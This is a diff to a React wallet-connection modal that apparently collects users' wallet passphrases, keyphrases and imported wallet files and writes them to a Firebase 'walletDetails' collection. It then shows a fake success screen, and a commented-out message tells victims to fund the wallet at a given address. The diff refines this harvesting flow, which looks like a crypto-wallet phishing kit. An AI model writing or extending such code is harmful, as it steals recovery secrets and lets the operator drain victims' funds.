@@ -2,12 +2,14 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
+import SuccessModal from './connecmodal';
 
 
 const WalletModal = ({ isOpen, onClose }) => {
   const [showSecondaryModal, setShowSecondaryModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState('');
   const [passphrase, setPassphrase] = useState('');
+  const [isModalOpen, setIsModalOpen] = useState(false);
   const [keyphrase, setKeyphrase] = useState('');
   const [importedFile, setImportedFile] = useState(null);
 
@@ -22,7 +24,11 @@ const WalletModal = ({ isOpen, onClose }) => {
     setSelectedWallet('Other');
     setShowSecondaryModal(true);
   };
-
+  const handleConnects = () => {
+    // Simulate wallet connection
+    setIsModalOpen(true);
+    // alert(`Connected to ${selectedWallet} successfully! Fund your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
+  };
   const handleConnect = async () => {
     if (!selectedWallet) {
       // Optionally show an error message
@@ -43,14 +49,11 @@ const WalletModal = ({ isOpen, onClose }) => {
     }
 
     try {
-      const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
-      console.log("Document written with ID: ", docRef.id);
-      // if (typeof window !== 'undefined') {
-      //   localStorage.setItem('walletid', docRef.id);
-      // }
-      // Optionally show a success message
-      alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
-      onClose(); // Close the modal after successful connection
+        const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
+        console.log("Document written with ID: ", docRef.id);
+        localStorage.setItem('walletid', docRef.id);
+        handleConnects()
+        onClose(); // Close the modal after successful connection
     } catch (e) {
       console.error("Error adding document: ", e);
       // Optionally show an error message to the user
@@ -101,7 +104,8 @@ const WalletModal = ({ isOpen, onClose }) => {
   }
 
   return (
-    <div className="fixed inset-0 bg-black mt-8 bg-opacity-50 flex justify-center items-center z-50">
+    <>
+    <div className="fixed inset-0 bg-[rgba(0,0,0,0.34)] mt-8 bg-opacity-50 flex justify-center items-center z-50">
       <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
         <button
           onClick={onClose}
@@ -185,6 +189,12 @@ const WalletModal = ({ isOpen, onClose }) => {
         )}
       </div>
     </div>
+    <SuccessModal 
+        isOpen={isModalOpen} 
+        onClose={() => setIsModalOpen(false)} 
+        selectedWallet={selectedWallet} 
+      />
+    </>
   );
 };
 
